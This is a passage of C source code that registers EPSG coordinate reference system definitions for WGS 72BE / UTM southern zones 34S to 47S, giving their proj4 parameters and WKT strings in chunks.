(p, 1,\n        \"0,0,0.814,-0.38 +units=m +no_defs\");\n    add_srs_wkt (p, 0,\n        \"PROJCS[\\\"WGS 72BE / UTM zone 34S\\\",GEOGCS[\\\"WGS 72BE\\\",D\");\n    add_srs_wkt (p, 1,\n        \"ATUM[\\\"WGS_1972_Transit_Broadcast_Ephemeris\\\",SPHEROID[\\\"\");\n    add_srs_wkt (p, 2,\n        \"WGS 72\\\",6378135,298.26,AUTHORITY[\\\"EPSG\\\",\\\"7043\\\"]],TO\");\n    add_srs_wkt (p, 3,\n        \"WGS84[0,0,1.9,0,0,0.814,-0.38],AUTHORITY[\\\"EPSG\\\",\\\"6324\");\n    add_srs_wkt (p, 4,\n        \"\\\"]],PRIMEM[\\\"Greenwich\\\",0,AUTHORITY[\\\"EPSG\\\",\\\"8901\\\"]\");\n    add_srs_wkt (p, 5,\n        \"],UNIT[\\\"degree\\\",0.0174532925199433,AUTHORITY[\\\"EPSG\\\",\");\n    add_srs_wkt (p, 6,\n        \"\\\"9122\\\"]],AUTHORITY[\\\"EPSG\\\",\\\"4324\\\"]],PROJECTION[\\\"Tr\");\n    add_srs_wkt (p, 7,\n        \"ansverse_Mercator\\\"],PARAMETER[\\\"latitude_of_origin\\\",0]\");\n    add_srs_wkt (p, 8,\n        \",PARAMETER[\\\"central_meridian\\\",21],PARAMETER[\\\"scale_fa\");\n    add_srs_wkt (p, 9,\n        \"ctor\\\",0.9996],PARAMETER[\\\"false_easting\\\",500000],PARAM\");\n    add_srs_wkt (p, 10,\n        \"ETER[\\\"false_northing\\\",10000000],UNIT[\\\"metre\\\",1,AUTHO\");\n    add_srs_wkt (p, 11,\n        \"RITY[\\\"EPSG\\\",\\\"9001\\\"]],AXIS[\\\"Easting\\\",EAST],AXIS[\\\"N\");\n    add_srs_wkt (p, 12,\n        \"orthing\\\",NORTH],AUTHORITY[\\\"EPSG\\\",\\\"32534\\\"]]\");\n    p = add_epsg_def (filter, first, last, 32535, \"epsg\", 32535,\n        \"WGS 72BE / UTM zone 35S\");\n    add_proj4text (p, 0,\n        \"+proj=utm +zone=35 +south +ellps=WGS72 +towgs84=0,0,1.9,\");\n    add_proj4text (p, 1,\n        \"0,0,0.814,-0.38 +units=m +no_defs\");\n    add_srs_wkt (p, 0,\n        \"PROJCS[\\\"WGS 72BE / UTM zone 35S\\\",GEOGCS[\\\"WGS 72BE\\\",D\");\n    add_srs_wkt (p, 1,\n        \"ATUM[\\\"WGS_1972_Transit_Broadcast_Ephemeris\\\",SPHEROID[\\\"\");\n    add_srs_wkt (p, 2,\n        \"WGS 72\\\",6378135,298.26,AUTHORITY[\\\"EPSG\\\",\\\"7043\\\"]],TO\");\n    add_srs_wkt (p, 3,\n        \"WGS84[0,0,1.9,0,0,0.814,-0.38],AUTHORITY[\\\"EPSG\\\",\\\"6324\");\n    add_srs_wkt (p, 4,\n        \"\\\"]],PRIMEM[\\\"Greenwich\\\",0,AUTHORITY[\\\"EPSG\\\",\\\"8901\\\"]\");\n    add_srs_wkt (p, 5,\n        \"],UNIT[\\\"degree\\\",0.0174532925199433,AUTHORITY[\\\"EPSG\\\",\");\n    add_srs_wkt (p, 6,\n        \"\\\"9122\\\"]],AUTHORITY[\\\"EPSG\\\",\\\"4324\\\"]],PROJECTION[\\\"Tr\");\n    add_srs_wkt (p, 7,\n        \"ansverse_Mercator\\\"],PARAMETER[\\\"latitude_of_origin\\\",0]\");\n    add_srs_wkt (p, 8,\n        \",PARAMETER[\\\"central_meridian\\\",27],PARAMETER[\\\"scale_fa\");\n    add_srs_wkt (p, 9,\n        \"ctor\\\",0.9996],PARAMETER[\\\"false_easting\\\",500000],PARAM\");\n    add_srs_wkt (p, 10,\n        \"ETER[\\\"false_northing\\\",10000000],UNIT[\\\"metre\\\",1,AUTHO\");\n    add_srs_wkt (p, 11,\n        \"RITY[\\\"EPSG\\\",\\\"9001\\\"]],AXIS[\\\"Easting\\\",EAST],AXIS[\\\"N\");\n    add_srs_wkt (p, 12,\n        \"orthing\\\",NORTH],AUTHORITY[\\\"EPSG\\\",\\\"32535\\\"]]\");\n    p = add_epsg_def (filter, first, last, 32536, \"epsg\", 32536,\n        \"WGS 72BE / UTM zone 36S\");\n    add_proj4text (p, 0,\n        \"+proj=utm +zone=36 +south +ellps=WGS72 +towgs84=0,0,1.9,\");\n    add_proj4text (p, 1,\n        \"0,0,0.814,-0.38 +units=m +no_defs\");\n    add_srs_wkt (p, 0,\n        \"PROJCS[\\\"WGS 72BE / UTM zone 36S\\\",GEOGCS[\\\"WGS 72BE\\\",D\");\n    add_srs_wkt (p, 1,\n        \"ATUM[\\\"WGS_1972_Transit_Broadcast_Ephemeris\\\",SPHEROID[\\\"\");\n    add_srs_wkt (p, 2,\n        \"WGS 72\\\",6378135,298.26,AUTHORITY[\\\"EPSG\\\",\\\"7043\\\"]],TO\");\n    add_srs_wkt (p, 3,\n        \"WGS84[0,0,1.9,0,0,0.814,-0.38],AUTHORITY[\\\"EPSG\\\",\\\"6324\");\n    add_srs_wkt (p, 4,\n        \"\\\"]],PRIMEM[\\\"Greenwich\\\",0,AUTHORITY[\\\"EPSG\\\",\\\"8901\\\"]\");\n    add_srs_wkt (p, 5,\n        \"],UNIT[\\\"degree\\\",0.0174532925199433,AUTHORITY[\\\"EPSG\\\",\");\n    add_srs_wkt (p, 6,\n        \"\\\"9122\\\"]],AUTHORITY[\\\"EPSG\\\",\\\"4324\\\"]],PROJECTION[\\\"Tr\");\n    add_srs_wkt (p, 7,\n        \"ansverse_Mercator\\\"],PARAMETER[\\\"latitude_of_origin\\\",0]\");\n    add_srs_wkt (p, 8,\n        \",PARAMETER[\\\"central_meridian\\\",33],PARAMETER[\\\"scale_fa\");\n    add_srs_wkt (p, 9,\n        \"ctor\\\",0.9996],PARAMETER[\\\"false_easting\\\",500000],PARAM\");\n    add_srs_wkt (p, 10,\n        \"ETER[\\\"false_northing\\\",10000000],UNIT[\\\"metre\\\",1,AUTHO\");\n    add_srs_wkt (p, 11,\n        \"RITY[\\\"EPSG\\\",\\\"9001\\\"]],AXIS[\\\"Easting\\\",EAST],AXIS[\\\"N\");\n    add_srs_wkt (p, 12,\n        \"orthing\\\",NORTH],AUTHORITY[\\\"EPSG\\\",\\\"32536\\\"]]\");\n    p = add_epsg_def (filter, first, last, 32537, \"epsg\", 32537,\n        \"WGS 72BE / UTM zone 37S\");\n    add_proj4text (p, 0,\n        \"+proj=utm +zone=37 +south +ellps=WGS72 +towgs84=0,0,1.9,\");\n    add_proj4text (p, 1,\n        \"0,0,0.814,-0.38 +units=m +no_defs\");\n    add_srs_wkt (p, 0,\n        \"PROJCS[\\\"WGS 72BE / UTM zone 37S\\\",GEOGCS[\\\"WGS 72BE\\\",D\");\n    add_srs_wkt (p, 1,\n        \"ATUM[\\\"WGS_1972_Transit_Broadcast_Ephemeris\\\",SPHEROID[\\\"\");\n    add_srs_wkt (p, 2,\n        \"WGS 72\\\",6378135,298.26,AUTHORITY[\\\"EPSG\\\",\\\"7043\\\"]],TO\");\n    add_srs_wkt (p, 3,\n        \"WGS84[0,0,1.9,0,0,0.814,-0.38],AUTHORITY[\\\"EPSG\\\",\\\"6324\");\n    add_srs_wkt (p, 4,\n        \"\\\"]],PRIMEM[\\\"Greenwich\\\",0,AUTHORITY[\\\"EPSG\\\",\\\"8901\\\"]\");\n    add_srs_wkt (p, 5,\n        \"],UNIT[\\\"degree\\\",0.0174532925199433,AUTHORITY[\\\"EPSG\\\",\");\n    add_srs_wkt (p, 6,\n        \"\\\"9122\\\"]],AUTHORITY[\\\"EPSG\\\",\\\"4324\\\"]],PROJECTION[\\\"Tr\");\n    add_srs_wkt (p, 7,\n        \"ansverse_Mercator\\\"],PARAMETER[\\\"latitude_of_origin\\\",0]\");\n    add_srs_wkt (p, 8,\n        \",PARAMETER[\\\"central_meridian\\\",39],PARAMETER[\\\"scale_fa\");\n    add_srs_wkt (p, 9,\n        \"ctor\\\",0.9996],PARAMETER[\\\"false_easting\\\",500000],PARAM\");\n    add_srs_wkt (p, 10,\n        \"ETER[\\\"false_northing\\\",10000000],UNIT[\\\"metre\\\",1,AUTHO\");\n    add_srs_wkt (p, 11,\n        \"RITY[\\\"EPSG\\\",\\\"9001\\\"]],AXIS[\\\"Easting\\\",EAST],AXIS[\\\"N\");\n    add_srs_wkt (p, 12,\n        \"orthing\\\",NORTH],AUTHORITY[\\\"EPSG\\\",\\\"32537\\\"]]\");\n    p = add_epsg_def (filter, first, last, 32538, \"epsg\", 32538,\n        \"WGS 72BE / UTM zone 38S\");\n    add_proj4text (p, 0,\n        \"+proj=utm +zone=38 +south +ellps=WGS72 +towgs84=0,0,1.9,\");\n    add_proj4text (p, 1,\n        \"0,0,0.814,-0.38 +units=m +no_defs\");\n    add_srs_wkt (p, 0,\n        \"PROJCS[\\\"WGS 72BE / UTM zone 38S\\\",GEOGCS[\\\"WGS 72BE\\\",D\");\n    add_srs_wkt (p, 1,\n        \"ATUM[\\\"WGS_1972_Transit_Broadcast_Ephemeris\\\",SPHEROID[\\\"\");\n    add_srs_wkt (p, 2,\n        \"WGS 72\\\",6378135,298.26,AUTHORITY[\\\"EPSG\\\",\\\"7043\\\"]],TO\");\n    add_srs_wkt (p, 3,\n        \"WGS84[0,0,1.9,0,0,0.814,-0.38],AUTHORITY[\\\"EPSG\\\",\\\"6324\");\n    add_srs_wkt (p, 4,\n        \"\\\"]],PRIMEM[\\\"Greenwich\\\",0,AUTHORITY[\\\"EPSG\\\",\\\"8901\\\"]\");\n    add_srs_wkt (p, 5,\n        \"],UNIT[\\\"degree\\\",0.0174532925199433,AUTHORITY[\\\"EPSG\\\",\");\n    add_srs_wkt (p, 6,\n        \"\\\"9122\\\"]],AUTHORITY[\\\"EPSG\\\",\\\"4324\\\"]],PROJECTION[\\\"Tr\");\n    add_srs_wkt (p, 7,\n        \"ansverse_Mercator\\\"],PARAMETER[\\\"latitude_of_origin\\\",0]\");\n    add_srs_wkt (p, 8,\n        \",PARAMETER[\\\"central_meridian\\\",45],PARAMETER[\\\"scale_fa\");\n    add_srs_wkt (p, 9,\n        \"ctor\\\",0.9996],PARAMETER[\\\"false_easting\\\",500000],PARAM\");\n    add_srs_wkt (p, 10,\n        \"ETER[\\\"false_northing\\\",10000000],UNIT[\\\"metre\\\",1,AUTHO\");\n    add_srs_wkt (p, 11,\n        \"RITY[\\\"EPSG\\\",\\\"9001\\\"]],AXIS[\\\"Easting\\\",EAST],AXIS[\\\"N\");\n    add_srs_wkt (p, 12,\n        \"orthing\\\",NORTH],AUTHORITY[\\\"EPSG\\\",\\\"32538\\\"]]\");\n    p = add_epsg_def (filter, first, last, 32539, \"epsg\", 32539,\n        \"WGS 72BE / UTM zone 39S\");\n    add_proj4text (p, 0,\n        \"+proj=utm +zone=39 +south +ellps=WGS72 +towgs84=0,0,1.9,\");\n    add_proj4text (p, 1,\n        \"0,0,0.814,-0.38 +units=m +no_defs\");\n    add_srs_wkt (p, 0,\n        \"PROJCS[\\\"WGS 72BE / UTM zone 39S\\\",GEOGCS[\\\"WGS 72BE\\\",D\");\n    add_srs_wkt (p, 1,\n        \"ATUM[\\\"WGS_1972_Transit_Broadcast_Ephemeris\\\",SPHEROID[\\\"\");\n    add_srs_wkt (p, 2,\n        \"WGS 72\\\",6378135,298.26,AUTHORITY[\\\"EPSG\\\",\\\"7043\\\"]],TO\");\n    add_srs_wkt (p, 3,\n        \"WGS84[0,0,1.9,0,0,0.814,-0.38],AUTHORITY[\\\"EPSG\\\",\\\"6324\");\n    add_srs_wkt (p, 4,\n        \"\\\"]],PRIMEM[\\\"Greenwich\\\",0,AUTHORITY[\\\"EPSG\\\",\\\"8901\\\"]\");\n    add_srs_wkt (p, 5,\n        \"],UNIT[\\\"degree\\\",0.0174532925199433,AUTHORITY[\\\"EPSG\\\",\");\n    add_srs_wkt (p, 6,\n        \"\\\"9122\\\"]],AUTHORITY[\\\"EPSG\\\",\\\"4324\\\"]],PROJECTION[\\\"Tr\");\n    add_srs_wkt (p, 7,\n        \"ansverse_Mercator\\\"],PARAMETER[\\\"latitude_of_origin\\\",0]\");\n    add_srs_wkt (p, 8,\n        \",PARAMETER[\\\"central_meridian\\\",51],PARAMETER[\\\"scale_fa\");\n    add_srs_wkt (p, 9,\n        \"ctor\\\",0.9996],PARAMETER[\\\"false_easting\\\",500000],PARAM\");\n    add_srs_wkt (p, 10,\n        \"ETER[\\\"false_northing\\\",10000000],UNIT[\\\"metre\\\",1,AUTHO\");\n    add_srs_wkt (p, 11,\n        \"RITY[\\\"EPSG\\\",\\\"9001\\\"]],AXIS[\\\"Easting\\\",EAST],AXIS[\\\"N\");\n    add_srs_wkt (p, 12,\n        \"orthing\\\",NORTH],AUTHORITY[\\\"EPSG\\\",\\\"32539\\\"]]\");\n    p = add_epsg_def (filter, first, last, 32540, \"epsg\", 32540,\n        \"WGS 72BE / UTM zone 40S\");\n    add_proj4text (p, 0,\n        \"+proj=utm +zone=40 +south +ellps=WGS72 +towgs84=0,0,1.9,\");\n    add_proj4text (p, 1,\n        \"0,0,0.814,-0.38 +units=m +no_defs\");\n    add_srs_wkt (p, 0,\n        \"PROJCS[\\\"WGS 72BE / UTM zone 40S\\\",GEOGCS[\\\"WGS 72BE\\\",D\");\n    add_srs_wkt (p, 1,\n        \"ATUM[\\\"WGS_1972_Transit_Broadcast_Ephemeris\\\",SPHEROID[\\\"\");\n    add_srs_wkt (p, 2,\n        \"WGS 72\\\",6378135,298.26,AUTHORITY[\\\"EPSG\\\",\\\"7043\\\"]],TO\");\n    add_srs_wkt (p, 3,\n        \"WGS84[0,0,1.9,0,0,0.814,-0.38],AUTHORITY[\\\"EPSG\\\",\\\"6324\");\n    add_srs_wkt (p, 4,\n        \"\\\"]],PRIMEM[\\\"Greenwich\\\",0,AUTHORITY[\\\"EPSG\\\",\\\"8901\\\"]\");\n    add_srs_wkt (p, 5,\n        \"],UNIT[\\\"degree\\\",0.0174532925199433,AUTHORITY[\\\"EPSG\\\",\");\n    add_srs_wkt (p, 6,\n        \"\\\"9122\\\"]],AUTHORITY[\\\"EPSG\\\",\\\"4324\\\"]],PROJECTION[\\\"Tr\");\n    add_srs_wkt (p, 7,\n        \"ansverse_Mercator\\\"],PARAMETER[\\\"latitude_of_origin\\\",0]\");\n    add_srs_wkt (p, 8,\n        \",PARAMETER[\\\"central_meridian\\\",57],PARAMETER[\\\"scale_fa\");\n    add_srs_wkt (p, 9,\n        \"ctor\\\",0.9996],PARAMETER[\\\"false_easting\\\",500000],PARAM\");\n    add_srs_wkt (p, 10,\n        \"ETER[\\\"false_northing\\\",10000000],UNIT[\\\"metre\\\",1,AUTHO\");\n    add_srs_wkt (p, 11,\n        \"RITY[\\\"EPSG\\\",\\\"9001\\\"]],AXIS[\\\"Easting\\\",EAST],AXIS[\\\"N\");\n    add_srs_wkt (p, 12,\n        \"orthing\\\",NORTH],AUTHORITY[\\\"EPSG\\\",\\\"32540\\\"]]\");\n    p = add_epsg_def (filter, first, last, 32541, \"epsg\", 32541,\n        \"WGS 72BE / UTM zone 41S\");\n    add_proj4text (p, 0,\n        \"+proj=utm +zone=41 +south +ellps=WGS72 +towgs84=0,0,1.9,\");\n    add_proj4text (p, 1,\n        \"0,0,0.814,-0.38 +units=m +no_defs\");\n    add_srs_wkt (p, 0,\n        \"PROJCS[\\\"WGS 72BE / UTM zone 41S\\\",GEOGCS[\\\"WGS 72BE\\\",D\");\n    add_srs_wkt (p, 1,\n        \"ATUM[\\\"WGS_1972_Transit_Broadcast_Ephemeris\\\",SPHEROID[\\\"\");\n    add_srs_wkt (p, 2,\n        \"WGS 72\\\",6378135,298.26,AUTHORITY[\\\"EPSG\\\",\\\"7043\\\"]],TO\");\n    add_srs_wkt (p, 3,\n        \"WGS84[0,0,1.9,0,0,0.814,-0.38],AUTHORITY[\\\"EPSG\\\",\\\"6324\");\n    add_srs_wkt (p, 4,\n        \"\\\"]],PRIMEM[\\\"Greenwich\\\",0,AUTHORITY[\\\"EPSG\\\",\\\"8901\\\"]\");\n    add_srs_wkt (p, 5,\n        \"],UNIT[\\\"degree\\\",0.0174532925199433,AUTHORITY[\\\"EPSG\\\",\");\n    add_srs_wkt (p, 6,\n        \"\\\"9122\\\"]],AUTHORITY[\\\"EPSG\\\",\\\"4324\\\"]],PROJECTION[\\\"Tr\");\n    add_srs_wkt (p, 7,\n        \"ansverse_Mercator\\\"],PARAMETER[\\\"latitude_of_origin\\\",0]\");\n    add_srs_wkt (p, 8,\n        \",PARAMETER[\\\"central_meridian\\\",63],PARAMETER[\\\"scale_fa\");\n    add_srs_wkt (p, 9,\n        \"ctor\\\",0.9996],PARAMETER[\\\"false_easting\\\",500000],PARAM\");\n    add_srs_wkt (p, 10,\n        \"ETER[\\\"false_northing\\\",10000000],UNIT[\\\"metre\\\",1,AUTHO\");\n    add_srs_wkt (p, 11,\n        \"RITY[\\\"EPSG\\\",\\\"9001\\\"]],AXIS[\\\"Easting\\\",EAST],AXIS[\\\"N\");\n    add_srs_wkt (p, 12,\n        \"orthing\\\",NORTH],AUTHORITY[\\\"EPSG\\\",\\\"32541\\\"]]\");\n    p = add_epsg_def (filter, first, last, 32542, \"epsg\", 32542,\n        \"WGS 72BE / UTM zone 42S\");\n    add_proj4text (p, 0,\n        \"+proj=utm +zone=42 +south +ellps=WGS72 +towgs84=0,0,1.9,\");\n    add_proj4text (p, 1,\n        \"0,0,0.814,-0.38 +units=m +no_defs\");\n    add_srs_wkt (p, 0,\n        \"PROJCS[\\\"WGS 72BE / UTM zone 42S\\\",GEOGCS[\\\"WGS 72BE\\\",D\");\n    add_srs_wkt (p, 1,\n        \"ATUM[\\\"WGS_1972_Transit_Broadcast_Ephemeris\\\",SPHEROID[\\\"\");\n    add_srs_wkt (p, 2,\n        \"WGS 72\\\",6378135,298.26,AUTHORITY[\\\"EPSG\\\",\\\"7043\\\"]],TO\");\n    add_srs_wkt (p, 3,\n        \"WGS84[0,0,1.9,0,0,0.814,-0.38],AUTHORITY[\\\"EPSG\\\",\\\"6324\");\n    add_srs_wkt (p, 4,\n        \"\\\"]],PRIMEM[\\\"Greenwich\\\",0,AUTHORITY[\\\"EPSG\\\",\\\"8901\\\"]\");\n    add_srs_wkt (p, 5,\n        \"],UNIT[\\\"degree\\\",0.0174532925199433,AUTHORITY[\\\"EPSG\\\",\");\n    add_srs_wkt (p, 6,\n        \"\\\"9122\\\"]],AUTHORITY[\\\"EPSG\\\",\\\"4324\\\"]],PROJECTION[\\\"Tr\");\n    add_srs_wkt (p, 7,\n        \"ansverse_Mercator\\\"],PARAMETER[\\\"latitude_of_origin\\\",0]\");\n    add_srs_wkt (p, 8,\n        \",PARAMETER[\\\"central_meridian\\\",69],PARAMETER[\\\"scale_fa\");\n    add_srs_wkt (p, 9,\n        \"ctor\\\",0.9996],PARAMETER[\\\"false_easting\\\",500000],PARAM\");\n    add_srs_wkt (p, 10,\n        \"ETER[\\\"false_northing\\\",10000000],UNIT[\\\"metre\\\",1,AUTHO\");\n    add_srs_wkt (p, 11,\n        \"RITY[\\\"EPSG\\\",\\\"9001\\\"]],AXIS[\\\"Easting\\\",EAST],AXIS[\\\"N\");\n    add_srs_wkt (p, 12,\n        \"orthing\\\",NORTH],AUTHORITY[\\\"EPSG\\\",\\\"32542\\\"]]\");\n    p = add_epsg_def (filter, first, last, 32543, \"epsg\", 32543,\n        \"WGS 72BE / UTM zone 43S\");\n    add_proj4text (p, 0,\n        \"+proj=utm +zone=43 +south +ellps=WGS72 +towgs84=0,0,1.9,\");\n    add_proj4text (p, 1,\n        \"0,0,0.814,-0.38 +units=m +no_defs\");\n    add_srs_wkt (p, 0,\n        \"PROJCS[\\\"WGS 72BE / UTM zone 43S\\\",GEOGCS[\\\"WGS 72BE\\\",D\");\n    add_srs_wkt (p, 1,\n        \"ATUM[\\\"WGS_1972_Transit_Broadcast_Ephemeris\\\",SPHEROID[\\\"\");\n    add_srs_wkt (p, 2,\n        \"WGS 72\\\",6378135,298.26,AUTHORITY[\\\"EPSG\\\",\\\"7043\\\"]],TO\");\n    add_srs_wkt (p, 3,\n        \"WGS84[0,0,1.9,0,0,0.814,-0.38],AUTHORITY[\\\"EPSG\\\",\\\"6324\");\n    add_srs_wkt (p, 4,\n        \"\\\"]],PRIMEM[\\\"Greenwich\\\",0,AUTHORITY[\\\"EPSG\\\",\\\"8901\\\"]\");\n    add_srs_wkt (p, 5,\n        \"],UNIT[\\\"degree\\\",0.0174532925199433,AUTHORITY[\\\"EPSG\\\",\");\n    add_srs_wkt (p, 6,\n        \"\\\"9122\\\"]],AUTHORITY[\\\"EPSG\\\",\\\"4324\\\"]],PROJECTION[\\\"Tr\");\n    add_srs_wkt (p, 7,\n        \"ansverse_Mercator\\\"],PARAMETER[\\\"latitude_of_origin\\\",0]\");\n    add_srs_wkt (p, 8,\n        \",PARAMETER[\\\"central_meridian\\\",75],PARAMETER[\\\"scale_fa\");\n    add_srs_wkt (p, 9,\n        \"ctor\\\",0.9996],PARAMETER[\\\"false_easting\\\",500000],PARAM\");\n    add_srs_wkt (p, 10,\n        \"ETER[\\\"false_northing\\\",10000000],UNIT[\\\"metre\\\",1,AUTHO\");\n    add_srs_wkt (p, 11,\n        \"RITY[\\\"EPSG\\\",\\\"9001\\\"]],AXIS[\\\"Easting\\\",EAST],AXIS[\\\"N\");\n    add_srs_wkt (p, 12,\n        \"orthing\\\",NORTH],AUTHORITY[\\\"EPSG\\\",\\\"32543\\\"]]\");\n    p = add_epsg_def (filter, first, last, 32544, \"epsg\", 32544,\n        \"WGS 72BE / UTM zone 44S\");\n    add_proj4text (p, 0,\n        \"+proj=utm +zone=44 +south +ellps=WGS72 +towgs84=0,0,1.9,\");\n    add_proj4text (p, 1,\n        \"0,0,0.814,-0.38 +units=m +no_defs\");\n    add_srs_wkt (p, 0,\n        \"PROJCS[\\\"WGS 72BE / UTM zone 44S\\\",GEOGCS[\\\"WGS 72BE\\\",D\");\n    add_srs_wkt (p, 1,\n        \"ATUM[\\\"WGS_1972_Transit_Broadcast_Ephemeris\\\",SPHEROID[\\\"\");\n    add_srs_wkt (p, 2,\n        \"WGS 72\\\",6378135,298.26,AUTHORITY[\\\"EPSG\\\",\\\"7043\\\"]],TO\");\n    add_srs_wkt (p, 3,\n        \"WGS84[0,0,1.9,0,0,0.814,-0.38],AUTHORITY[\\\"EPSG\\\",\\\"6324\");\n    add_srs_wkt (p, 4,\n        \"\\\"]],PRIMEM[\\\"Greenwich\\\",0,AUTHORITY[\\\"EPSG\\\",\\\"8901\\\"]\");\n    add_srs_wkt (p, 5,\n        \"],UNIT[\\\"degree\\\",0.0174532925199433,AUTHORITY[\\\"EPSG\\\",\");\n    add_srs_wkt (p, 6,\n        \"\\\"9122\\\"]],AUTHORITY[\\\"EPSG\\\",\\\"4324\\\"]],PROJECTION[\\\"Tr\");\n    add_srs_wkt (p, 7,\n        \"ansverse_Mercator\\\"],PARAMETER[\\\"latitude_of_origin\\\",0]\");\n    add_srs_wkt (p, 8,\n        \",PARAMETER[\\\"central_meridian\\\",81],PARAMETER[\\\"scale_fa\");\n    add_srs_wkt (p, 9,\n        \"ctor\\\",0.9996],PARAMETER[\\\"false_easting\\\",500000],PARAM\");\n    add_srs_wkt (p, 10,\n        \"ETER[\\\"false_northing\\\",10000000],UNIT[\\\"metre\\\",1,AUTHO\");\n    add_srs_wkt (p, 11,\n        \"RITY[\\\"EPSG\\\",\\\"9001\\\"]],AXIS[\\\"Easting\\\",EAST],AXIS[\\\"N\");\n    add_srs_wkt (p, 12,\n        \"orthing\\\",NORTH],AUTHORITY[\\\"EPSG\\\",\\\"32544\\\"]]\");\n    p = add_epsg_def (filter, first, last, 32545, \"epsg\", 32545,\n        \"WGS 72BE / UTM zone 45S\");\n    add_proj4text (p, 0,\n        \"+proj=utm +zone=45 +south +ellps=WGS72 +towgs84=0,0,1.9,\");\n    add_proj4text (p, 1,\n        \"0,0,0.814,-0.38 +units=m +no_defs\");\n    add_srs_wkt (p, 0,\n        \"PROJCS[\\\"WGS 72BE / UTM zone 45S\\\",GEOGCS[\\\"WGS 72BE\\\",D\");\n    add_srs_wkt (p, 1,\n        \"ATUM[\\\"WGS_1972_Transit_Broadcast_Ephemeris\\\",SPHEROID[\\\"\");\n    add_srs_wkt (p, 2,\n        \"WGS 72\\\",6378135,298.26,AUTHORITY[\\\"EPSG\\\",\\\"7043\\\"]],TO\");\n    add_srs_wkt (p, 3,\n        \"WGS84[0,0,1.9,0,0,0.814,-0.38],AUTHORITY[\\\"EPSG\\\",\\\"6324\");\n    add_srs_wkt (p, 4,\n        \"\\\"]],PRIMEM[\\\"Greenwich\\\",0,AUTHORITY[\\\"EPSG\\\",\\\"8901\\\"]\");\n    add_srs_wkt (p, 5,\n        \"],UNIT[\\\"degree\\\",0.0174532925199433,AUTHORITY[\\\"EPSG\\\",\");\n    add_srs_wkt (p, 6,\n        \"\\\"9122\\\"]],AUTHORITY[\\\"EPSG\\\",\\\"4324\\\"]],PROJECTION[\\\"Tr\");\n    add_srs_wkt (p, 7,\n        \"ansverse_Mercator\\\"],PARAMETER[\\\"latitude_of_origin\\\",0]\");\n    add_srs_wkt (p, 8,\n        \",PARAMETER[\\\"central_meridian\\\",87],PARAMETER[\\\"scale_fa\");\n    add_srs_wkt (p, 9,\n        \"ctor\\\",0.9996],PARAMETER[\\\"false_easting\\\",500000],PARAM\");\n    add_srs_wkt (p, 10,\n        \"ETER[\\\"false_northing\\\",10000000],UNIT[\\\"metre\\\",1,AUTHO\");\n    add_srs_wkt (p, 11,\n        \"RITY[\\\"EPSG\\\",\\\"9001\\\"]],AXIS[\\\"Easting\\\",EAST],AXIS[\\\"N\");\n    add_srs_wkt (p, 12,\n        \"orthing\\\",NORTH],AUTHORITY[\\\"EPSG\\\",\\\"32545\\\"]]\");\n    p = add_epsg_def (filter, first, last, 32546, \"epsg\", 32546,\n        \"WGS 72BE / UTM zone 46S\");\n    add_proj4text (p, 0,\n        \"+proj=utm +zone=46 +south +ellps=WGS72 +towgs84=0,0,1.9,\");\n    add_proj4text (p, 1,\n        \"0,0,0.814,-0.38 +units=m +no_defs\");\n    add_srs_wkt (p, 0,\n        \"PROJCS[\\\"WGS 72BE / UTM zone 46S\\\",GEOGCS[\\\"WGS 72BE\\\",D\");\n    add_srs_wkt (p, 1,\n        \"ATUM[\\\"WGS_1972_Transit_Broadcast_Ephemeris\\\",SPHEROID[\\\"\");\n    add_srs_wkt (p, 2,\n        \"WGS 72\\\",6378135,298.26,AUTHORITY[\\\"EPSG\\\",\\\"7043\\\"]],TO\");\n    add_srs_wkt (p, 3,\n        \"WGS84[0,0,1.9,0,0,0.814,-0.38],AUTHORITY[\\\"EPSG\\\",\\\"6324\");\n    add_srs_wkt (p, 4,\n        \"\\\"]],PRIMEM[\\\"Greenwich\\\",0,AUTHORITY[\\\"EPSG\\\",\\\"8901\\\"]\");\n    add_srs_wkt (p, 5,\n        \"],UNIT[\\\"degree\\\",0.0174532925199433,AUTHORITY[\\\"EPSG\\\",\");\n    add_srs_wkt (p, 6,\n        \"\\\"9122\\\"]],AUTHORITY[\\\"EPSG\\\",\\\"4324\\\"]],PROJECTION[\\\"Tr\");\n    add_srs_wkt (p, 7,\n        \"ansverse_Mercator\\\"],PARAMETER[\\\"latitude_of_origin\\\",0]\");\n    add_srs_wkt (p, 8,\n        \",PARAMETER[\\\"central_meridian\\\",93],PARAMETER[\\\"scale_fa\");\n    add_srs_wkt (p, 9,\n        \"ctor\\\",0.9996],PARAMETER[\\\"false_easting\\\",500000],PARAM\");\n    add_srs_wkt (p, 10,\n        \"ETER[\\\"false_northing\\\",10000000],UNIT[\\\"metre\\\",1,AUTHO\");\n    add_srs_wkt (p, 11,\n        \"RITY[\\\"EPSG\\\",\\\"9001\\\"]],AXIS[\\\"Easting\\\",EAST],AXIS[\\\"N\");\n    add_srs_wkt (p, 12,\n        \"orthing\\\",NORTH],AUTHORITY[\\\"EPSG\\\",\\\"32546\\\"]]\");\n    p = add_epsg_def (filter, first, last, 32547, \"epsg\", 32547,\n        \"WGS 72BE / UTM zone 47S\");\n    add_proj4text (p, 0,\n        \"+proj=utm +zone=47 +south +ellps=WGS72 +towgs84=0,0,1.9,\");\n    add_proj4text (p, 1,\n        \"0,0,0.814,-0.38 +units=m +no_defs\");\n    add_srs_wkt (p, 0,\n        \"PROJCS[\\\"WGS 72BE / UTM zone 47S\\\",GEOGCS[\\\"WGS 72BE\\\",D\");\n    add_srs_wkt (p, 1,\n        \"ATUM[\\\"WGS_1972_Transit_Broadcast_Ephemeris\\\",SPHEROID[\\\"\");\n    add_srs_wkt (p, 2,\n        \"WGS 72\\\",6378135,298.26,AUTHORITY[\\\"EPSG\\\",\\\"7043\\\"]],TO\");\n    add_srs_wkt (p, 3,\n        \"WGS84[0,0,1.9,0,0,0.814,-0.38],AUTHORITY[\\\"EPSG\\\",\\\"6324\");\n    add_srs_wkt (p, 4,\n        \"\\\"]],PRIMEM[\\\"Greenwich\\\",0,AUTHORITY[\\\"EPSG\\\",\\\"8901\\\"]\");\n    add_srs_wkt (p, 5,\n        \"],UNIT[\\\"degree\\\",0.0174532925199433,AUTHORITY[\\\"EPSG\\\",\");\n    add_srs_wkt (p, 6,\n        \"\\\"9122\\\"]],AUTHORITY[\\\"EPSG\\\",\\\"4324\\\"]],PROJECTION[\\\"Tr\");\n    add_srs_wkt (p, 7,\n        \"ansverse_Mercator\\\"],PARAMETER[\\\"latitude_of_origin\\\",0]\");\n    add_srs_wkt (p, 8,\n        \",PARAMETER[\\\"central_meridian\\\",99],PARAMETER[\\\"scale_fa\");\n    add_srs_wkt (p, 9,\n        